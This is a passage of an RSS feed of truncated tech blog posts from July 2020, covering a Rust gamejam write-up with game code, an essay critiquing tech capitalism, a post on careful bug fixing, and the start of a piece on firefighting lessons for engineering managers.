</span></code></pre>
<p>On web the above isn't possible because it would prevent returning control to the browser. It's not appropriate to lock up while waiting for an an asset to return from a server, so all loads are asynchronous.</p>
<p>An approach like the following could be used in Rust:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>fetch_asset</span><span>("</span><span>wind.wav</span><span>");

</span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>None</span><span>;
    </span><span>/* Respond to events and draw requests here */
    </span><span>if let </span><span>Some</span><span>(</span><span>loaded_asset</span><span>) =</span><span> wind_sound_handle</span><span>.</span><span>get_asset</span><span>() {</span><span>
        window_sound </span><span>=</span><span> loaded_asset</span><span>;
    }

    </span><span>/* Respond to events and draw here */
</span><span>});
</span></code></pre>
<p>But that approach can lead to tedious bookkeeping, which is the opposite of what you want for a gamejam.</p>
<p>Instead I decided to use Rust's relatively new feature: <code>async</code>. Fortunately I had recently added <code>asyc</code> support to <code>kApp</code>.</p>
<p>Rust's <code>async</code> feature generates a state machine for a function that allows it to pause and later resume when ready.</p>
<p>An <code>async</code> function can look very similar to a traditional infinite game loop:</p>
<pre><code><span>async </span><span>fn </span><span>run</span><span>(</span><span>app</span><span>:</span><span> Application, </span><span>events</span><span>:</span><span> Events</span><span>) {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>audio</span><span>::</span><span>load_audio</span><span>("</span><span>wind.wav</span><span>").</span><span>await</span><span>.</span><span>unwrap</span><span>();
    </span><span>loop </span><span>{
        </span><span>match</span><span> events</span><span>.</span><span>next_event</span><span>().</span><span>await </span><span>{
            </span><span>/* Respond to events and draw here */
        </span><span>}
    }
}
</span></code></pre>
<p>This let me load assets with one line and not have to worry about any bookkeeping. Perfect!</p>
<h2 id="game-design">Game Design</h2>
<p>The theme for this Ludum Dare was "Keep It Alive" which immediately struck me as overly morbid given the rapid spread of coronavirus. I couldn't motivate myself to create a game about death, and I nearly decided to quit the jam entirely.</p>
<p>Instead I looked for alternative ways to interpret the theme. As I stared out my apartment window towards San Francisco hills I thought about the way people droop their heads as they walk to and from work. It's a beautiful world, but it's tough to notice the beauty every day when the routine of life weighs heavy.</p>
<p>What if you played as a spirit to lift people up? You could keep their "wonder" alive. You'd play as some sort of spirit and perhaps you'd lift a commuter bicyclist up into the sky where you'd whisk them around and show them the stars.</p>
<p>I imagined you'd guide the bicyclist through the sky to collect stars and people on the ground would notice and point up in awe.</p>
<p>It was difficult to figure out how to pair that idea to gameplay, but what I settled upon was a game inspired by the old school flash game <a href="https://www.linerider.com/">Line Rider</a>.</p>
<p>You'd draw lines for the bicyclist and they'd roll along those lines and bump into collectible stars.</p>
<h2 id="implementation">Implementation</h2>
<p>The plan was to implement the physics of the character as a rolling ball and then substitute in character art for the bicyclist.</p>
<p>The first thing I needed was line rendering. I ripped some code out of a prior Rust project that would generate mesh line segments by creating rectangles with circles at the ends. I wasn't sure if this heavy-handed approach to line joins would cause problems. Each individual line segment was made up of a bunch of triangles so I felt that perhaps the game would lag as too many lines appeared.</p>
<p>I stress tested this by scribbling the entire screen full of lines over and over, and I was shocked when the framerate didn't drop at all.</p>
<p>For the physics I took some math for finding the closest point on a line to the ball. If the point is inside the ball then check if the ball's velocity is moving towards the point. If the ball is moving towards the point then "bounce" the ball by pushing the opposite direction on the ball.</p>
<p>The heart of the collision code wasn't very long at all:</p>
<pre><code><span> </span><span>fn </span><span>check_lines</span><span>(&amp;</span><span>mut </span><span>self</span><span>, </span><span>points</span><span>: &amp;</span><span>[Vector3]</span><span>) {
    </span><span>let</span><span> len </span><span>=</span><span> points</span><span>.</span><span>len</span><span>();

    </span><span>for</span><span> i </span><span>in (</span><span>1</span><span>..</span><span>len</span><span>).</span><span>step_by</span><span>(</span><span>2</span><span>) {
        </span><span>let </span><span>(</span><span>distance</span><span>,</span><span> p</span><span>) = </span><span>point_with_line_segment</span><span>(</span><span>self</span><span>.</span><span>position</span><span>,</span><span> points</span><span>[</span><span>i </span><span>- </span><span>1</span><span>],</span><span> points</span><span>[</span><span>i</span><span>]);

        </span><span>if</span><span> distance
            </span><span>&lt; (</span><span>self</span><span>.</span><span>radius </span><span>+ </span><span>LINE_RADIUS </span><span>- </span><span>0.001</span><span>/* Allow ball to sink slightly into surface*/</span><span>)
        {
            </span><span>let</span><span> normal_of_collision </span><span>= (</span><span>self</span><span>.</span><span>position </span><span>-</span><span> p</span><span>).</span><span>normal</span><span>();
            </span><span>let</span><span> velocity_along_collision </span><span>= </span><span>Vector3</span><span>::</span><span>dot</span><span>(</span><span>normal_of_collision</span><span>, </span><span>self</span><span>.</span><span>velocity</span><span>);
            </span><span>if</span><span> velocity_along_collision </span><span>&lt; </span><span>0.0 </span><span>{
                </span><span>self</span><span>.</span><span>velocity </span><span>-=</span><span> normal_of_collision </span><span>*</span><span> velocity_along_collision </span><span>* </span><span>1.4</span><span>;
            }
            </span><span>self</span><span>.</span><span>position </span><span>+=</span><span> normal_of_collision </span><span>* </span><span>0.0001</span><span>;
        }
    }
}
</span></code></pre>
<p>(The code could have been a little cleaner had I known about the <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks">chunks</a> method on iterators.)</p>
<p>I was pretty surprised at how great the ball physics felt without much tuning. When I started with this design the physics felt like a big unknown for me. I felt like I might not be able to get them right within the 48 hour window, but coding the physics was actually one of the shortest features in the project.</p>
<p>I was pretty concerned that the …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ianjk.com/rust-gamejam/">https://ianjk.com/rust-gamejam/</a></em></p>]]>
            </description>
            <link>https://ianjk.com/rust-gamejam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836386</guid>
            <pubDate>Tue, 14 Jul 2020 19:14:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reclaiming Technology (From Capital)]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23836329">thread link</a>) | @twazzle
<br/>
July 14, 2020 | https://t.wang.sh/reclaiming-technology | <a href="https://web.archive.org/web/*/https://t.wang.sh/reclaiming-technology">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span>July 14, 2020</span><span>&nbsp; ▴ &nbsp;</span><span>9 minute read 🥤🥤</span><span>🥤🥤</span></p><p>––– views</p></div><p><a href="https://unsplash.com/photos/EOnlL3L3IgQ" target="_blank" rel="nofollow"><span>
      <span></span>
  <img alt="Photo by Aaron Lau on Unsplash" title="Photo by Aaron Lau on Unsplash" src="https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/29d31/sf.jpg" srcset="https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/e52aa/sf.jpg 175w,https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/70ebb/sf.jpg 350w,https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/29d31/sf.jpg 700w,https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/9ecec/sf.jpg 1050w,https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/d165a/sf.jpg 1400w,https://t.wang.sh/static/04199391ac3bf1d6970db96b72a149bf/b17f8/sf.jpg 1600w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
    </span></a></p><blockquote>If you get shown a problem, but have no idea how to control it, you just decide to get used to it.</blockquote><p>When I first got into coding in 2016, I looked at the tech industry with glassy eyes. I was coming off winning a university business pitch competition and felt like I had discovered this hidden treasure trove of amazing people, ideas, and opportunity. Coding, to me, felt like the key that unlocked the doors to this treasure. I was sure that if I just mastered this skill, I’d be welcomed with open arms into this abundant, innovative community.</p><p>On the outside, the modern tech industry epitomizes the American dream. Startups dominate the scene, with funding seemingly available for any wild idea out there. I believed that tech was truly democratizing and that with enough hard work, anyone could find success.</p><p><strong>It’s now 2020, and I no longer hold these views.</strong></p><p>The pivotal points that informed my worldview came from a failed app startup and subsequent grueling job searches. I got lucky a couple of times along the way: receiving an initial angel investment for my app, and also working full-time at <a href="https://designcode.io/" target="_blank" rel="nofollow">Design+Code</a>. On the other hand, I went through hundreds of arduous processes and rejections from startup accelerators, investors, and companies, and saw the struggles of my peers who had less luck and privilege than me. These experiences culminated in me waking up to the true nature of the tech industry. Despite being confident in my newfound coding ability, I had not been handed a key to any sort of treasure. Instead, I was offered a pick and shovel and told to mine gold – to make the treasure pile bigger for those who already have it. Ironically, many of the institutions I talked to refused to give me their pick and shovel, claiming they needed better and more experienced miners.</p><p>The foundation on which the modern tech industry is built upon – <a href="https://nyti.ms/2uXTBPA" target="_blank" rel="nofollow">American capitalism</a> – is fundamentally flawed, and now commonly referred to as late-stage capitalism. This is because we have reached a stage where a tiny percentage of people have accumulated so much capital that they not only exclusively dictate which ideas are worth building, but also dictate who is worthy of building those ideas. When people say that the American Dream is dead, this is what they mean.</p><p>Our society’s continual worship of capital, and of those who hold it, has created extreme inequality that threatens the ideals of a free, democratic society. We are bound to the whim of capital, and to the individuals and groups who have accumulated it.</p><p><strong>It’s time we did something about this – but what can we do?</strong></p><h2 id="chapter-11-a-new-industrial-model-from-abolish-silicon-valley"><a href="#chapter-11-a-new-industrial-model-from-abolish-silicon-valley" aria-label="chapter 11 a new industrial model from abolish silicon valley permalink"></a>Chapter 11: A New Industrial Model, from Abolish Silicon Valley</h2><p>The subtitle of <a href="https://dellsystem.me/" target="_blank" rel="nofollow">Wendy Liu</a>’s new book, <a href="https://abolishsiliconvalley.com/" target="_blank" rel="nofollow">Abolish Silicon Valley</a>, is <em>How to Liberate Technology from Capitalism</em>. Chapter 11, <em>A New Industrial Model</em>, specifically proposes five steps to <em>reclaim our world from capital</em>.</p><p><a href="https://abolishsiliconvalley.com/" target="_blank" rel="nofollow"><span>
      <span></span>
  <img alt="Abolish Silicon Valley: How to Liberate Technology from Capitalism" title="Abolish Silicon Valley: How to Liberate Technology from Capitalism" src="https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/8c557/book.png" srcset="https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/4edbd/book.png 175w,https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/13ae7/book.png 350w,https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/8c557/book.png 700w,https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/e996b/book.png 1050w,https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/2cefc/book.png 1400w,https://t.wang.sh/static/bfd436970b73b3b22b39a77a5972d0bd/0734a/book.png 4266w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
    </span></a></p><p>In <a href="https://abolishsiliconvalley.com/" target="_blank" rel="nofollow">Abolish Silicon Valley</a>, Wendy details her first-hand experience working at Google as a software engineering intern, and then as a founder of a tech startup. She presents an intimate look into the inner workings of the tech industry and the stark issues that plague it. I encourage anyone interested in a deeply personal, inside look into the tech industry to pick up Wendy’s book. In this post, I will aim to explore the proposals in Chapter 11, A New Industrial Model, and spark a conversation around how we can begin to address the problems created by capital.</p><blockquote>...we don't owe capital anything. The things we attribute to capital were built by workers: people who labored and sometimes died in the process, their contributions unrecognized in death as in life. So don't thank capital – it doesn't deserve our gratitude, and it doesn't need it, anyway. Thank the people who created everything that capital always takes credit for.</blockquote><h2 id="reclaiming-entrepreneurship"><a href="#reclaiming-entrepreneurship" aria-label="reclaiming entrepreneurship permalink"></a>Reclaiming Entrepreneurship</h2><p><a href="https://unsplash.com/photos/jw3GOzxiSkw" target="_blank" rel="nofollow"><span>
      <span></span>
  <img alt="Photo by Rohan Makhecha on Unsplash" title="Photo by Rohan Makhecha on Unsplash" src="https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/8c557/entrepreneurship.png" srcset="https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/4edbd/entrepreneurship.png 175w,https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/13ae7/entrepreneurship.png 350w,https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/8c557/entrepreneurship.png 700w,https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/e996b/entrepreneurship.png 1050w,https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/2cefc/entrepreneurship.png 1400w,https://t.wang.sh/static/01c558971dc16b38c4c59b13bf2ead86/29007/entrepreneurship.png 1600w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
    </span></a></p><p>Reclaiming entrepreneurship is the first proposal. The central argument is to have entrepreneurship be accountable to <em>the public</em>, versus <em>private shareholders</em>. Today, this is more commonly referred to as “social entrepreneurship,” where the primary goal is to address social, cultural, or environmental issues rather than turning a profit and returning capital to private investors. To this end, a nonprofit structure works best, as nonprofits have no owners and are accountable to the public and the state. <a href="#references" title="reference">¹</a></p><p>The argument for private ownership usually goes something like this – that without the prospect of reaping the capital benefits of said ownership, people wouldn’t be incentivized to innovate and we would lose all the nice things we have. This argument may hold some truth in a developing world, but today, the incredible wealth concentration created by our current system actually stifles innovation. Real wages have stayed stagnant, fewer companies are being started, and only companies whose products promise to deliver outlandish returns of capital are considered viable. <a href="#references" title="reference">²</a> To make matters worse, Black women, America’s most entrepreneurial demographic, only receive 0.0006% of venture capital funding. <a href="#references" title="reference">³</a></p><p>The standard model for entrepreneurship today is to have an idea, receive investment for that idea, then build it, scale it, and finally return the investment by getting acquired or going public. This model is set up to make the founders, executives, and investors fabulously wealthy. There is no nuance nor any regard for side effects; as long as there is a large return on investment, the venture is considered a success. Thus, the spirit of entrepreneurship and innovation has been clouded by capital. Only by removing this perverse incentive structure and reimagining this standard model, can we expect to have innovation return to America.</p><h2 id="reclaiming-work"><a href="#reclaiming-work" aria-label="reclaiming work permalink"></a>Reclaiming Work</h2><div>
  <p>
    <span>
      <a href="https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/6e52c/balance.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Tech workers vs. everybody else" title="Tech workers vs. everybody else" src="https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/8c557/balance.png" srcset="https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/4edbd/balance.png 175w,https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/13ae7/balance.png 350w,https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/8c557/balance.png 700w,https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/e996b/balance.png 1050w,https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/2cefc/balance.png 1400w,https://t.wang.sh/static/20283e346e324056ca53972aabaf8c29/6e52c/balance.png 1948w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span>
  </p>
  <p>
    <span>
      <a href="https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/6e52c/balance-dark.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Tech workers vs. everybody else" title="Tech workers vs. everybody else" src="https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/8c557/balance-dark.png" srcset="https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/4edbd/balance-dark.png 175w,https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/13ae7/balance-dark.png 350w,https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/8c557/balance-dark.png 700w,https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/e996b/balance-dark.png 1050w,https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/2cefc/balance-dark.png 1400w,https://t.wang.sh/static/d7c841b320ac665e25a32d82f0dd8615/6e52c/balance-dark.png 1948w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span>
  </p></div><p>One thing I find incredibly frustrating is when extremely well-paid, full-time tech workers in Silicon Valley or other tech hubs complain about their salaries. To me, it’s the equivalent of sitting in a fancy restaurant, whining that you didn’t get the same amount of desert as the table sitting next to you, all while people eat garbage in the streets.</p><p>At Google, there exists a large contractor workforce referred to as their “shadow workforce,” a group that outnumbers full-time employees. Most tech companies have contingent labor that makes up for 40-50% of their workforce. <a href="#references" title="reference">⁴</a> This division of the American workforce in the tech industry has created a culture of entitlement at the top and resentment at the bottom. Capitalism requires the wealthy class to own the means of production, so keeping full-time employees (who work on the product) happy is important. However, companies are constantly trying to optimize production, so when a contract workforce can replace production without sacrificing control, companies will outsource this work. As long as we are in a capital-directed system, we can expect the growing trend of contract workers to continue.</p><p>For companies that have increasing contractor workforces, contractors must have a clear path to convert to full-time employees. Contractors who choose not to convert must be paid a higher wage than full-time employees since they aren’t provided benefits. Gig economy workers, like Uber and Lyft drivers, should be given control and flexibility over the jobs they take, the ability to negotiate pay, and a way for workers to collectively bargain and resolve issues with their company. An interesting alternative model for gig workers could be <a href="https://platform.coop/" target="_blank" rel="nofollow">platform co-ops</a>, in which a digital platforms like Uber and Lyft would be owned by the people who depend on and participate in it (the drivers).</p><p>The other proposed solutions in reclaiming work have to do with shifting the power to the working class, reducing income inequality, and improving technological development. These proposals include:</p><ul><li>Giving corporate board seats to democratically elected workers</li><li>Implementing a maximum wage whereby you base the highest-paid wage (typically the CEO) to the lowest-paid wage</li><li>Ensure more equal distribution of stock, or removing stock grants for employees entirely</li><li>Public salary transparency with posted salary bands</li><li>Nationalization of companies with excess profits obtained through rent-seeking, or a combination of lowering prices, increasing R&amp;D spending, increasing wages, and raising taxes</li><li>A strict wealth tax on individuals with a high amount of savings drawing passive income from investments</li><li>Worker control over new technology introduced in the workplace to fit the needs of workers over management</li><li>Software/technical licensing for individuals that comes with a tech version of the Hippocratic oath, with free training and a stipend for higher levels</li><li>A “hiring hall” model that works by a project-by-project basis, instead of being employed at a specific company</li></ul><p>A shocking metaphor for the modern workplace is this idea that workers exist in a system of feudalism, under a complex hierarchy and power structure that intends on making bosses feel like kings and queens. <a href="#references" title="reference">⁵</a> The further we go into late-stage capitalism, the ugliest sides of human history repeat itself. To avoid a further downward spiraling of our most basic freedoms and rights, it is paramount that we take steps to reclaim work for all workers.</p><h2 id="reclaiming-public-services"><a href="#reclaiming-public-services" aria-label="reclaiming public services permalink"></a>Reclaiming Public Services</h2><p>The above tweet by digital researcher and librarian <a href="https://twitter.com/erinroseglass" target="_blank" rel="nofollow">Erin Rose Glass</a> captures succinctly the need for certain industries to be public services rather than owned by private corporations. With software innovation dominating the past decade, we have seen an emergence of surveillance capitalism, where our private data is used to drive engagement and profit. The Internet, which was created based on the principles of free information, decentralized ownership, and open protocols and infrastructure, has been hijacked by private enterprise. <a href="#references" title="reference">⁶</a> We have seen our data analyzed by computational products which aim to predict our behavior, these predictions traded on a new …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://t.wang.sh/reclaiming-technology">https://t.wang.sh/reclaiming-technology</a></em></p>]]>
            </description>
            <link>https://t.wang.sh/reclaiming-technology</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836329</guid>
            <pubDate>Tue, 14 Jul 2020 19:10:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Event Driven Level Design]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23835963">thread link</a>) | @bourgoisloic
<br/>
July 14, 2020 | https://loicbourgois.com/event-driven-level-design/index.html | <a href="https://web.archive.org/web/*/https://loicbourgois.com/event-driven-level-design/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="right-panel">
      
      <p>[space] to jump</p>
      
      
      <div id="controls">
        
        
        
      </div>
      <div id="editor">
        
        </div>
    </div></div>]]>
            </description>
            <link>https://loicbourgois.com/event-driven-level-design/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23835963</guid>
            <pubDate>Tue, 14 Jul 2020 18:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You've only added two lines – why did that take two days?]]>
            </title>
            <description>
<![CDATA[
Score 812 | Comments 459 (<a href="https://news.ycombinator.com/item?id=23835918">thread link</a>) | @gregdoesit
<br/>
July 14, 2020 | https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html | <a href="https://web.archive.org/web/*/https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pagepbt">
<!-- #masthead -->
<div id="contentpbt">
<div id="primarypbt">
<div id="mainpbt" role="main">
<div id="mainblogsec"><div data-version="1" id="Blog1">
<div>
<!--Can't find substitution for tag [defaultAdStart]-->

          <div>
        


          <div>
        
<div>
<article itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a name="8378966868534474355"></a>


<div id="post-body-8378966868534474355" itemprop="articleBody"><p>
It might seem a reasonable question, but it makes some terrible assumptions:</p><ul>
<li>lines of code = effort</li>
<li>lines of code = value</li>
<li>all lines of code are equal</li>
</ul>

<p>
Why did a fix that seems so simple when looking at the changes made take two days to complete?</p>
<div>
<ul>
<li><b>Because the issue was reported with a vague description of how to recreate it.</b> It took me several hours to get to a reliable reproduction of the item. Some developers would have immediately gone back to the person reporting the problem and required more information before investigating. I try and do as much as I can with the information provided. I know some developers don't like having to fix bugs, and so do whatever they can to get out of it. Claiming there isn't enough is a great way to look like you're trying to help but not have to do anything. I know that reporting errors can be hard, and I'm grateful for anyone who does. I want to show appreciation for error reports by trying to do as much as possible with the information provided before asking for more details.</li>
<li><b>Because the reported issue was related to functionality, I'm not familiar with.</b>&nbsp;The feature it was to do with was something I rarely use and is not something I've ever used in great detail. This meant it took me longer than it might to understand how to use it and the nuances of how it interacts with the software with the bug.</li>
<li><b>Because I took the time to investigate the real cause of the issue, not just looking at the symptoms</b>. If some code is throwing an error, you could just wrap it in a try..catch statement and suppress the error. No error, no problem. Right? Sorry, for me, making the problem invisible isn't the same as fixing it. "Swallowing" an error can easily lead to other unexpected side-effects. I don't want to have to deal with them at a point in the future.</li>
<li><b>Because I investigated if there were other ways of getting to the same problem, not just the reported reproduction steps</b>. One set of reproduction steps can easily make the error appear to be in one place when it may actually be more deep-seated. Finding the exact cause of a problem, and looking at all the ways to get there can provide valuable insights. Insights such as how the code is actually used, where there might be other places with possible (other?) problems that might need addressing, or it may show inconsistencies in the code that mean an error is caused (or handled) in one code path but not another.</li>
<li><b>Because I took the time to verify if there were other parts of the code that might be affected in similar ways</b>. If a mistake led to the bug, the same error could have also been made elsewhere in the code-base. Now's a great time to check.&nbsp;</li>
<li><b>Because when I found the cause of the issue, I looked to find the simplest way of fixing it that would have minimal risk of introducing side-effects</b>. I don't want the quickest possible fix. I want a fix that isn't likely to cause confusion or other problems in the future.</li>
<li><b>Because I tested the change thoroughly and verified that it addressed the problem for all the different code paths that were affected</b>. I don't want to rely on someone else to have to test that what I've done is correct. I don't want a bug to be found in the future and for me to have to come back to this code when I've mentally moved on. Context switching is expensive and frustrating. Having a dedicated tester have to look at the "same" change again is something I want to avoid whenever possible.</li>
</ul>

</div>
<div><p>
I don't like having to fix bugs. Partly because they can feel like the result of a previous failure on my part. The other reason I don't like fixing bugs is that I'd prefer to be working on new things.</p><p>

What's worse than having to fix a bug?<br>
Having to fix the same bug repeatedly.<br>
I take the time to make sure any bug is totally fixed any time it is encountered so that it doesn't need to be faced, investigated, fixed, and tested more than once.</p></div>





</div>

<div>
<p><span>
<span>
<a href="https://www.blogger.com/email-post.g?blogID=33176002&amp;postID=8378966868534474355" title="Email Post">
<img alt="" height="13" src="https://img1.blogblog.com/img/icon18_email.gif" width="18">
</a>
</span>
</span></p>

</div>





</article>




</div>

        </div></div>
      
<!--Can't find substitution for tag [adEnd]-->
</div>

</div></div>
</div><!-- #main -->
</div><!-- #primary -->
<!-- #secondary -->
</div><!-- #content -->
<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23835918</guid>
            <pubDate>Tue, 14 Jul 2020 18:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What firefighting taught me for my job as an engineering manager]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23835909">thread link</a>) | @andygrunwald
<br/>
July 14, 2020 | https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/#not-only-for-managers | <a href="https://web.archive.org/web/*/https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/#not-only-for-managers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree.jpg" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree_hu00761edcb0e9c7da5edfb31ed8e7b79e_140481_360x0_resize_q75_box.jpg 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree_hu00761edcb0e9c7da5edfb31ed8e7b79e_140481_700x0_resize_q75_box.jpg 700w" sizes="(max-width: 360px) 360px, (min-width: 700px) 700px"></figure><p><em>— This article is not only for managers! <a href="#not-only-for-managers">read why…</a></em></p><p>I joined the youth group of our small local volunteer fire department in the neighbourhood when I was 12 years old. As a teenager, I was not aware that the youth instructors applied a very smart mix of fun, training, repetition, and strict commands to transform us from clumsy youngsters to real firefighters. Later, I understood that it wasn’t an easy task. I learned how difficult it is to motivate teenagers and train them when I took over the youth instructor role and slowly got into this business (see picture above of my team of youngsters during a fire extinguisher training). It is a challenge to prepare, train, and guide 11-15 years old boys and girls 4 years long while keeping them motivated until they can finally join the crew of adults who extinguish house fires and rescue cats.</p><h2 id="nothing-is-more-difficult-than-motivating-people">Nothing is more difficult than motivating people</h2><p>One would think that the action of fighting a fire already motivates volunteer firefighters to join the weekly training in the evening, several multi-day courses every year, and take over responsibilities in the organization and, thus, sacrifice their free time.</p><p>I have learned that this is not that easy after I was more involved in the management of the organization and was finally elected as the deputy fire chief of our department after 15 years. It might sound corny, but volunteers don’t follow just because you have a higher rank. You need trust and people have to believe that you can handle an operation. If you give the command to enter a burning house, people will only follow your commands if they trust you (and if it makes sense).</p><p>If you give an order that people have to show up at the training next week, they won’t. They don’t have to. It is not the army, it is not their job, they will find excuses and will slowly fade out from the organization. I have experienced hard times when our crew of active people has shrunk from 50 to 20 people.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_1500x0_resize_q75_box.JPG" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_360x0_resize_q75_box.JPG 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_700x0_resize_q75_box.JPG 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Team of youngsters at a fire extinguisher training during my time as youth instructor</h4></figcaption></figure><h2 id="they-should-be-proud-to-work-for-us">They should be proud to work for us!</h2><p>Engineers work almost voluntarily for you. They earn a lot of money but as they work for you, they are really good I guess ;) and they will find another good job immediately. Thus, money isn’t a motivator for a longer period of time and you have to keep them motivated.
I already heard CEOs say: they should be proud to work for us. In the long run that even doesn’t work for the <a href="https://en.wikipedia.org/wiki/Big_Tech">Big Five</a>, so I assume, it won’t work for you either.</p><p>I figured that the dynamics of engineers and volunteer firefighter teams are very similar, maybe it applies even for all kinds of teams. In this post I have summarized my top five lessons learned from my time in the fire department and how it helped me to shape my leadership style as an engineering manager.</p><h2 id="lesson-1-provide-structure-and-keep-going">Lesson 1: Provide structure and keep going</h2><p>Especially when the motivation in the team is already down, for a lead, it is super hard to keep going. But this is exactly the most important phase and it is crucial to have a lead who does not give up. For a team in this downwards spiral, the most important thing is structure.</p><p>In the fire department, when the team got smaller and smaller due to a lack of motivation, we made a big mistake: We canceled some of the weekly drills as the group of present people was too small to practise bigger operations—or at least that was the excuse. As a result, even more people got bored and dropped out.</p><p>I saw similar situations in engineering teams when the motivation was down. People got more and more passive and they no longer proposed to catch up, to have brainstorming sessions, or to talk with each other to find the best solution for a problem.</p><p>In this situation it is essential to insist on the routine that you have hopefully already established before you experience difficult times. Do not accept cancellation requests for 1:1 sessions, retrospectives, or other regular meetings. In this dangerous situation, as a lead, you are the tower of strength and you can help the team to overcome the situation. It sounds quite easy but in reality it is not. In such situations I was depressed and unmotivated as well.</p><p>Everybody works differently but I think a piece of general advice is to stabilize yourself first. Do something outside of your job that makes you happy. Approach your allies (in private or business) and discuss the situation to be able to digest it faster. After that, support the team and keep the routine going. For the weekly firefighter drills I prepared backup plans in case too few people showed up. It is always good to have backup plans to be prepared and keep the system going. For 1:1s, you can try to bring some variety to it by e.g. <a href="https://jasonevanish.com/2014/05/29/101-questions-to-ask-in-1-on-1s/">asking different and new questions</a>.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_1500x0_resize_q75_box.jpg" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_360x0_resize_q75_box.jpg 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_700x0_resize_q75_box.jpg 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>We do regular trainings such as <a href="https://en.wikipedia.org/wiki/Flashover">Flash-over</a> container trainings to be prepared for the real 